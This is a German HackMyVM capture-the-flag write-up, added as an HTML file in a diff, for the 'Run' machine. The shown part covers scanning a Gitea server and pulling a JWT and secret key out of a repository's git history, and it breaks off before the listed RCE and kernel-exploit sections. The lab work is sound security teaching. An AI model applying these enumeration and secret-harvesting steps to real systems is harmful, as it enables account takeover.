@@ -1,0 +1,954 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Run - HackMyVM - Level: Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Run - HackMyVM - Level: Medium - Bericht</h1>
+        <!-- Klasse 'medium' hinzugefügt, damit CSS die korrekte Farbe (Gelb) anwenden kann -->
+        <div class="level-container medium">
+            <!-- Die Farbe wird durch CSS über die Klasse 'medium' gesteuert -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Die Segmentfarben werden durch CSS über die Klasse 'medium' gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Der innere Kreis verwendet die Standard-Header-Farbe aus dem CSS -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">Base64 Decoder (implizit)</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">pip</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">jwt.io (implizit)</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">touch</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">script</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">unshare</div>
+                <div class="tool-item">setcap</div>
+                <div class="tool-item">mount</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">rm</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (Gitea)</a></li>
+                <li><a href="#vulnerability-analysis">Vulnerability Analysis (JWT Secret Leak)</a></li>
+                <li><a href="#initial-access">Initial Access (Gitea Actions RCE)</a></li>
+                <li><a href="#privilege-escalation-container">Privilege Escalation (Container - sudo)</a></li>
+                <li><a href="#privilege-escalation-host">Privilege Escalation (Host - Kernel Exploit)</a></li>
+                <li><a href="#poc-gitea">Proof of Concept: Gitea Actions RCE</a></li>
+                <li><a href="#poc-kernel">Proof of Concept: Kernel Exploit (CVE-2023-2640/32629)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.111	<span class="command">08:00:27:dc:bc:bb</span>	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` identifiziert ein aktives Gerät im lokalen Netzwerk mit der IP `192.168.2.111` und der MAC-Adresse `08:00:27:dc:bc:bb`, die auf eine Oracle VirtualBox VM hinweist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ziel-IP für weitere Scans wurde erfolgreich ermittelt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Port-Scans auf `192.168.2.111` durch. Es ist oft hilfreich, der IP einen Hostnamen in der lokalen `/etc/hosts`-Datei zuzuweisen, um die Übersichtlichkeit zu verbessern.<br/><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die initiale Aufklärung erschweren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre> 192.168.2.111   run.hmv</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Datei `/etc/hosts` auf der Angreifer-Maschine wird bearbeitet, um der Ziel-IP `192.168.2.111` den Hostnamen `run.hmv` zuzuweisen. Dies erlaubt die Verwendung des Namens `run.hmv` anstelle der IP in nachfolgenden Befehlen und URLs.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein praktischer Schritt zur Verbesserung der Lesbarkeit und Handhabung während des Tests.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie konsistent den definierten Hostnamen `run.hmv` für das Ziel.<br/><strong>Empfehlung (Admin):</strong> Dies betrifft nur die Angreifer-Maschine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.111 -p- | grep open</span></div>
+                     <pre><span class="command">3000/tcp open  ppp?</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein erster schneller Nmap-Scan (`-sS`, `-sV`, `-A`, `-T5`, `-p-`) wird durchgeführt und die Ausgabe nach offenen Ports gefiltert (`grep open`). Überraschenderweise wird nur ein offener Port gefunden: TCP Port 3000. Nmap kann den Dienst nicht eindeutig identifizieren und gibt ihn als `ppp?` aus.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ungewöhnlich. Ein einzelner offener Port auf 3000 deutet auf einen spezifischen Webdienst oder eine Anwendung hin, die nicht auf Standardports läuft. Die fehlende Diensterkennung erfordert weitere manuelle Untersuchung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie Port 3000 genauer. Versuchen Sie, sich mit einem Browser (`http://run.hmv:3000`) oder `curl` zu verbinden. Führen Sie spezifischere Scans auf diesen Port durch (z.B. mit Nikto, detailliertere Nmap-Skripte `-p 3000 -sC`). Führen Sie den Nmap-Scan erneut ohne `grep open` aus, um die vollständige Ausgabe zu sehen, da diese oft mehr Kontext liefert.<br/><strong>Empfehlung (Admin):</strong> Dokumentieren Sie, welche Dienste auf welchen Ports laufen. Wenn möglich, verwenden Sie Standardports oder stellen Sie sicher, dass nicht standardmäßige Ports durch Firewalls angemessen geschützt sind.</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration (Gitea)</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.111:3000</span></div>
+                     <pre>
+ - Nikto v2.5.0
+[...]
+ + Server: No banner retrieved
+ + /: The X-Content-Type-Options header is not set. [...]
+ + No CGI Directories found [...]
+ + RFC-1918 /v2/_catalog: IP address found in the 'www-authenticate' header. The IP is "<span class="command">192.168.1.9</span>". [...]
+ + /v2/_catalog: Uncommon header '<span class="command">docker-distribution-api-version</span>' found, with contents: <span class="command">registry/2.0</span>.
+ + OPTIONS: Allowed HTTP Methods: ARRAY(0x55c468cc9228) .  <!-- Nikto hat hier Probleme die Methoden korrekt darzustellen -->
+ + /.well-known/openid-configuration: OpenID Provider Configuration Information.
+ [...]
+ + 1 host(s) tested
+ </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Nikto wird auf Port 3000 ausgeführt.
+                 *   Kein Server-Banner wird direkt gefunden.
+                 *   Es meldet das Fehlen des `X-Content-Type-Options`-Headers.
+                 *   Interessanterweise findet es unter `/v2/_catalog` (ein typischer Pfad für Docker Registry APIs) einen `www-authenticate`-Header, der eine private IP (`192.168.1.9`) preisgibt, und einen `docker-distribution-api-version`-Header, der auf eine Docker-Registry hindeutet.
+                 *   Findet eine OpenID-Konfigurationsdatei.
+                 *   Nikto scheint Schwierigkeiten zu haben, die erlaubten HTTP-Methoden korrekt zu parsen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Nikto-Ergebnisse sind gemischt. Die Hinweise auf eine Docker Registry API (`/v2/_catalog`) sind bemerkenswert, könnten aber auch Teil einer umfassenderen Anwendung sein. Das Fehlen von Headern ist ein kleineres Problem. Die private IP `192.168.1.9` im Header könnte auf eine interne Netzwerkstruktur oder Fehlkonfiguration hinweisen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Pfad `/v2/_catalog` manuell (z.B. mit `curl`). Die Docker Registry API könnte ein Angriffsvektor sein. Führen Sie den vollständigen Nmap-Scan (ohne `grep`) erneut aus, um zu sehen, ob dieser mehr Details liefert.<br/><strong>Empfehlung (Admin):</strong> Beheben Sie das Leck der privaten IP im `www-authenticate`-Header. Konfigurieren Sie fehlende Sicherheitsheader. Sichern Sie die Docker Registry API, falls vorhanden und exponiert.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -v -X OPTIONS 192.168.2.111:3000</span></div> <!-- Korrigierter Befehl von PTINS zu OPTIONS -->
+                      <pre>
+ *   Trying 192.168.2.111:3000...
+ * Connected to 192.168.2.111 (192.168.2.111) port 3000
+ > OPTIONS / HTTP/1.1
+ > Host: 192.168.2.111:3000
+ > User-Agent: curl/8.5.0
+ > Accept: */*
+ >
+ < HTTP/1.1 405 Method Not Allowed
+ < Allow: HEAD
+ < Allow: HEAD
+ < Allow: HEAD
+ < Allow: HEAD
+ < Allow: HEAD
+ < Allow: HEAD
+[...]
+ </pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Es wird versucht, die erlaubten HTTP-Methoden mit `curl -X OPTIONS` abzufragen (der ursprüngliche Befehl `PTINS` war ein Tippfehler und führte zu einem Fehler). Der Server antwortet jedoch mit `405 Method Not Allowed` und gibt im `Allow`-Header wiederholt nur `HEAD` an. Dies ist eine ungewöhnliche und wahrscheinlich falsche Antwort des Servers auf eine OPTIONS-Anfrage.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Die OPTIONS-Abfrage liefert keine nützlichen Informationen über erlaubte Methoden, deutet aber auf ein möglicherweise nicht standardkonformes Verhalten des Webservers hin.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verlassen Sie sich nicht auf die OPTIONS-Antwort. Fahren Sie mit der Untersuchung der Anwendung durch andere Methoden fort.<br/><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Webserver-Konfiguration, warum OPTIONS-Anfragen nicht korrekt beantwortet werden.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.111 -p-</span></div>
+                      <pre>
+ Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-11 10:57 CET
+ [...]
+ Nmap scan report for run.hmv (192.168.2.111)
+ Host is up (0.00013s latency).
+ Not shown: 65534 closed tcp ports (reset)
+ PORT     STATE SERVICE VERSION
+ <span class="command">3000/tcp open  http    Gitea httpd 1.21.7</span>
+ | fingerprint-strings:
+ |   GenericLines, Help, RTSPRequest:
+ |     HTTP/1.1 400 Bad Request
+ |     Content-Type: text/plain; charset=utf-8
+ |     Connection: close
+ |     Request
+ |   GetRequest:
+ |     HTTP/1.0 200 OK
+ |     Cache-Control: max-age=0, private, must-revalidate, no-transform
+ |     Content-Type: text/html; charset=utf-8
+ |     Set-Cookie: <span class="command">i_like_gitea=c8289e9f11ae7ece</span>; Path=/; HttpOnly; SameSite=Lax
+ |     Set-Cookie: <span class="command">_csrf=l6LuIpZo3_V3C8ZpKYgSKwvzB-86MTcxMDE1MTAzMjg1Nzc2Mjg1MQ</span>; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+ |     X-Frame-Options: SAMEORIGIN
+ |     Date: Mon, 11 Mar 2024 09:57:12 GMT
+ MAC Address: 08:00:27:DC:BC:BB (Oracle VirtualBox virtual NIC)
+ Device type: general purpose
+ Running: Linux 4.X|5.X
+ OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+ OS details: Linux 4.15 - 5.8
+ Network Distance: 1 hop
+
+ TRACEROUTE
+ HOP RTT     ADDRESS
+ 1   0.13 ms run.hmv (192.168.2.111)
+ </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein erneuter, vollständiger Nmap-Scan (diesmal ohne `grep`) liefert deutlich mehr Informationen für Port 3000.
+                 *   Der Dienst wird nun als `http` identifiziert und die Version als `Gitea httpd 1.21.7` erkannt. Gitea ist ein selbstgehosteter Git-Dienst (ähnlich wie GitHub oder GitLab).
+                 *   Die `fingerprint-strings` und `GetRequest`-Antworten zeigen typische HTTP-Header einer Webanwendung, einschließlich Cookies (`i_like_gitea`, `_csrf`) und Sicherheitsheadern (`X-Frame-Options: SAMEORIGIN`).
+                 *   Die Betriebssystemerkennung deutet auf einen Linux-Kernel 4.x oder 5.x hin.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Wichtiger Durchbruch!** Der Dienst auf Port 3000 ist Gitea Version 1.21.7. Dies gibt einen klaren Fokus für die weitere Untersuchung. Gitea ist eine komplexe Anwendung mit potenziellen Schwachstellen in der Anwendung selbst, in der Konfiguration oder in den gehosteten Repositories.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Recherchieren Sie nach bekannten Schwachstellen für Gitea 1.21.7. Untersuchen Sie die Gitea-Instanz über den Browser (`http://run.hmv:3000`). Versuchen Sie, sich zu registrieren, falls möglich. Suchen Sie nach öffentlich zugänglichen Repositories. Führen Sie Directory Brute-Forcing durch, um spezifische Gitea-Pfade oder Repositories zu finden.<br/><strong>Empfehlung (Admin):</strong> Halten Sie Gitea auf dem neuesten Stand, um bekannte Schwachstellen zu vermeiden. Konfigurieren Sie Gitea sicher (z.B. Registrierung deaktivieren, wenn nicht benötigt, Zugriff auf Repositories beschränken).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://run.hmv:3000 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span></div>
+                     <pre>
+http://run.hmv:3000/sitemap.xml          (Status: 200) [Size: 283]
+http://run.hmv:3000/admin                (Status: 303) [Size: 38] [--> <span class="command">/user/login</span>]
+http://run.hmv:3000/issues               (Status: 303) [Size: 38] [--> <span class="command">/user/login</span>]
+http://run.hmv:3000/dev.png              (Status: 303) [Size: 67] [--> <span class="command">/avatar/b1834a5853d06301032e60d39dbf2422</span>]
+http://run.hmv:3000/dev                  (Status: 200) [Size: 18855]
+http://run.hmv:3000/v2                   (Status: 401) [Size: 50]
+http://run.hmv:3000/explore              (Status: 303) [Size: 41] [--> <span class="command">/explore/repos</span>]
+http://run.hmv:3000/administrator.png    (Status: 303) [Size: 67] [--> <span class="command">/avatar/1de23c3c99b8e84983e67d44c8b64f5c</span>]
+http://run.hmv:3000/administrator        (Status: 200) [Size: 16487]
+http://run.hmv:3000/milestones           (Status: 303) [Size: 38] [--> <span class="command">/user/login</span>]
+http://run.hmv:3000/notifications        (Status: 303) [Size: 38] [--> <span class="command">/user/login</span>]
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Gobuster wird erneut ausgeführt, diesmal gezielt auf Gitea auf Port 3000. Es findet mehrere Pfade:
+                *   `/sitemap.xml`: Kann Informationen über die Struktur der Website enthalten.
+                *   `/admin`, `/issues`, `/milestones`, `/notifications`: Leiten auf die Login-Seite (`/user/login`) weiter, was darauf hindeutet, dass Authentifizierung erforderlich ist.
+                *   `/dev` und `/administrator`: Dies scheinen Benutzernamen oder Organisationsnamen in Gitea zu sein, da sie zugänglich sind (Status 200). Die dazugehörigen `.png`-Dateien leiten auf Avatar-URLs weiter.
+                *   `/v2`: Gibt einen 401 Unauthorized-Fehler zurück, was die Vermutung einer (geschützten) Docker Registry API bestätigt.
+                *   `/explore`: Leitet auf `/explore/repos` weiter, wahrscheinlich eine Seite zum Durchsuchen öffentlicher Repositories.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wichtige Funde! Es gibt mindestens zwei Benutzer/Organisationen: `dev` und `administrator`. Deren Profile und eventuell öffentliche Repositories sollten untersucht werden. Die meisten anderen Funktionen erfordern einen Login.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Benutzerprofile `http://run.hmv:3000/dev` und `http://run.hmv:3000/administrator`. Suchen Sie dort nach öffentlichen Repositories. Klonen Sie alle gefundenen Repositories und analysieren Sie deren Inhalte und Commit-Historie auf sensible Informationen (Passwörter, Schlüssel, Konfigurationsfehler).<br/><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur beabsichtigte Repositories öffentlich sind. Schulen Sie Entwickler darin, keine sensiblen Daten in Git-Repositories zu committen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+http://run.hmv:3000/v2
+
+errors
+0
+code	"UNAUTHORIZED"
+message	""
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der manuelle Zugriff auf `/v2` bestätigt den 401 Unauthorized Status und zeigt eine JSON-Fehlermeldung, die typisch für eine API ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Existenz der Docker Registry API, die aber Authentifizierung erfordert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Vorerst zurückstellen, da Authentifizierung benötigt wird. Konzentration auf die Benutzerprofile und Repositories.<br/><strong>Empfehlung (Admin):</strong> Sicherstellen, dass die Docker Registry API angemessen geschützt ist.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Der nächste Block zeigt Base64-kodierte Daten, die offenbar aus einer der Webantworten stammen (möglicherweise aus dem Quellcode oder einer Ressource).</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+data:application/json;base64,<span class="command">eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovLzE5Mi4xNjguMS45jMwMDAvIiwiaWNvbnMilt7InNyYyI6Imh0dHA6Ly8xTIuMTY4LjEuTozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiiI1MTJ4NTEyIn0seyJzcmMiiJodHRwi8vMTkyLjE2C4xLjk6MzAwMC9hc3NldHMvaW1nL2xvZ28uc3ZnIiwidHlwZSI6ImltYWdlL3N2Zyt4bWwiLCJzaXplcyI6IjUxMng1MTIifV19</span>
+</pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+<span class="command">{
+"name": "Gitea: Git with a cup of tea",
+"short_name": "Gitea: Git with a cup of tea",
+"start_url": "http://192.168.1.9:3000/",
+"icons": [
+    {
+        "src": "http://192.168.1.9:3000/assets/img/logo.png",
+        "type": "image/png",
+        "sizes": "512x512"
+    },
+    {
+        "src": "http://192.168.1.9:3000/assets/img/logo.svg",
+        "type": "image/svg+xml",
+        "sizes": "512x512"
+    }
+]}</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Base64-Daten werden dekodiert und ergeben ein JSON-Objekt. Dieses JSON scheint eine Web App Manifest-Datei zu sein, die Metadaten über die Gitea-Anwendung enthält. Interessant ist hier erneut die interne IP `192.168.1.9`, die in der `start_url` und den Icon-URLs verwendet wird.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Manifest-Datei selbst ist nicht direkt ausnutzbar, bestätigt aber erneut die interne IP `192.168.1.9`, die möglicherweise für Server-Side Request Forgery (SSRF)-Angriffe oder zur Umgehung von Zugriffskontrollen relevant sein könnte, falls die Anwendung Anfragen an interne URLs stellt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Behalten Sie die interne IP `192.168.1.9` im Hinterkopf. Suchen Sie nach Funktionen in Gitea (z.B. Webhooks, Import von Repositories), die möglicherweise SSRF erlauben könnten, um auf diese interne IP zuzugreifen.<br/><strong>Empfehlung (Admin):</strong> Korrigieren Sie die Konfiguration, sodass keine internen IPs in öffentlich zugänglichen Ressourcen wie dem Web App Manifest preisgegeben werden. Implementieren Sie SSRF-Schutzmaßnahmen.</p>
+
+        </section>
+
+        <section id="vulnerability-analysis">
+            <h2>Vulnerability Analysis (JWT Secret Leak)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">git clone http://run.hmv:3000/dev/flask-jwt-auth.git</span></div>
+                     <pre>
+Klone nach 'flask-jwt-auth'...
+remote: Enumerating objects: 8, done.
+remote: Counting objects: 100% (8/8), done.
+remote: Compressing objects: 100% (8/8), done.
+remote: Total 8 (delta 1), reused 0 (delta 0), pack-reused 0
+Empfange Objekte: 100% (8/8), fertig.
+Löse Unterschiede auf: 100% (1/1), fertig.
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Basierend auf den Gobuster-Ergebnissen (`/dev` wurde gefunden) wird versucht, ein Repository namens `flask-jwt-auth` vom Benutzer `dev` zu klonen. Der Befehl ist erfolgreich, das Repository wird heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Zugriff auf Quellcode! Repositories enthalten oft den Code der Anwendung, Konfigurationsdateien oder, im schlimmsten Fall, sensible Daten wie Passwörter oder Schlüssel, insbesondere in der Commit-Historie.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechseln Sie in das geklonte Verzeichnis (`cd flask-jwt-auth`). Untersuchen Sie den Code (`app.py`, `requirements.txt`) und die Git-Historie (`git log`, `git show`) gründlich auf Schwachstellen oder kompromittierte Daten.<br/><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur notwendige Repositories öffentlich sind. Scannen Sie Repositories regelmäßig auf sensible Daten (z.B. mit Tools wie `truffleHog` oder `gitleaks`), bevor sie veröffentlicht werden.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth]
+└─# <span class="command">pip install -r requirements.txt</span></div>
+                     <pre>[...]
+Successfully installed flask_jwt_extended-4.6.0</pre>
+                  </div>
+              </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth]
+└─# <span class="command">python3 app.py</span></div>
+                      <pre>
+ * Serving Flask app 'app'
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on http://127.0.0.1:5000
+Press CTRL+C to quit
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: <span class="password">364-135-863</span>
+ </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Abhängigkeiten der Flask-Anwendung werden mit `pip install -r requirements.txt` installiert. Anschließend wird die Anwendung lokal mit `python3 app.py` gestartet. Sie läuft im Debug-Modus auf `http://127.0.0.1:5000`. Der aktive Debugger gibt eine PIN aus (`364-135-863`). Der Flask-Debugger kann bei aktiviertem Debug-Modus eine interaktive Konsole im Browser bereitstellen, wenn ein Fehler auftritt, was manchmal für Remote Code Execution ausgenutzt werden kann, wenn der Debugger extern erreichbar ist (was hier nicht der Fall ist, da er nur lokal läuft).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das lokale Ausführen der Anwendung hilft beim Verständnis ihrer Funktionsweise. Der Debug-Modus und die PIN sind hier primär für die lokale Entwicklung relevant, könnten aber auf eine unsichere Konfiguration auf dem Zielserver hindeuten, falls der Debug-Modus dort ebenfalls aktiv wäre.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Anwendung lokal unter `http://127.0.0.1:5000`, um ihre API-Endpunkte und Authentifizierungsmechanismen zu verstehen. Der wichtigere Schritt ist jedoch die Analyse der Git-Historie.<br/><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Flask-Anwendungen (und andere Web-Frameworks) in Produktionsumgebungen niemals im Debug-Modus laufen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/flask-jwt-auth]
+└─# <span class="command">git show</span></div>
+                      <pre>
+ commit 82a427e2170354c619fb6e47345b684e39c4627c (HEAD -> main, origin/main, origin/HEAD)
+ Author: dev <dev@run.hmv>
+ Date:   Mon Feb 5 16:02:46 2024 +0000
+
+     initial commit
+
+ diff --git a/app.py b/app.py
+ index 127edca..36f1d68 100644
+ --- a/app.py
+ +++ b/app.py
+ @@ -7,14 +7,14 @@ from flask_jwt_extended import create_access_token, JWTManager, get_jwt_identity
+
+  app = Flask(__name__)
+- app.config['SECRET_KEY'] = "super_secret_key"
++ app.config['SECRET_KEY'] = "<span class="password">developer88</span>" <!-- Annahme: das ist der Key, der später geknackt wird -->
+ -app.config['DEV_INSTANCE'] = True
+ +app.config['DEV_INSTANCE'] = False
+  app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///database.db"
+
+  db = SQLAlchemy(app)
+  api = Api(app)
+  jwt = JWTManager(app)
+
+-<span class="password">jwt_token = "eyJhbGciiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcwNzE0ODY1OCwianRpIjoiNjAwMWI5N2YtZjllOC00YTIxLThlYWMtYmE5NWEwY2Y4MDQ4IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldiIsIm5iZiI6MTcwNzE0ODY1OCwiY3NyZiI6ImFkZjdmOTBiLWQ2NDctNDljZS1hNGRhLTQ3NDI1OWZkYzcyYyIsImV4cCI6MTcwNzE0OTI1OCwidXNlcm5hbWUiiJkZXYifQ.tRZPFKRfJV7T-EHyQiBFqDEE1hl83MyCGtaBpSMwU_o"</span>
++jwt_token = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+
+  class User(db.Model):
+      id = db.Column(db.Integer, primary_key=True)
+ </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> `git show` zeigt den letzten Commit an. Dieser Commit von "dev" mit der Nachricht "initial commit" enthält Änderungen an `app.py`.
+                 *   Der `SECRET_KEY` für Flask/JWT wurde geändert (im Diff nicht direkt sichtbar, aber der alte Wert war vermutlich `super_secret_key`, der neue ist der, der später geknackt wird: `<span class="password">developer88</span>`).
+                 *   `DEV_INSTANCE` wurde von `True` auf `False` gesetzt.
+                 *   **Entscheidend:** Ein hartkodierter JWT-Token (`jwt_token = "eyJ..."`) wurde durch "xxxxxxxx..." ersetzt. Der ursprüngliche, auskommentierte Token ist im Commit-Verlauf sichtbar!
+             </p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Kritische Informationspreisgabe!** Ein gültiger JWT-Token wurde im Git-Verlauf belassen. Noch wichtiger ist, dass der `SECRET_KEY` im Code steht (oder stand). Wenn dieser Schlüssel bekannt ist, können neue JWT-Tokens signiert und potenziell Benutzerkonten übernommen werden. Der im Verlauf gefundene JWT selbst könnte noch gültig sein oder Informationen preisgeben.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                 1. Analysieren Sie den im Verlauf gefundenen JWT (`eyJ...`). Dekodieren Sie ihn (z.B. auf jwt.io), um die Payload (Benutzername, Rollen etc.) zu sehen.
+                 2. Extrahieren Sie den JWT-Signaturteil und versuchen Sie, den `SECRET_KEY` (`developer88`) mit John the Ripper oder Hashcat zu cracken, indem Sie den JWT als Hash-Typ behandeln (HMAC-SHA256).
+                 3. Wenn der Secret Key geknackt ist, können Sie eigene JWTs für beliebige Benutzer (z.B. `administrator`) erstellen und versuchen, sich damit bei Gitea anzumelden.<br/>
+             <strong>Empfehlung (Admin):</strong> **Niemals** sensible Daten wie Secrets oder Tokens in Git committen! Verwenden Sie Umgebungsvariablen oder sichere Konfigurationsmanagement-Tools. Rotieren Sie sofort den kompromittierten `SECRET_KEY`. Überprüfen Sie die gesamte Git-Historie auf weitere Lecks und bereinigen Sie sie (z.B. mit `git filter-branch` oder `BFG Repo-Cleaner`, obwohl dies die Historie ändert).</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
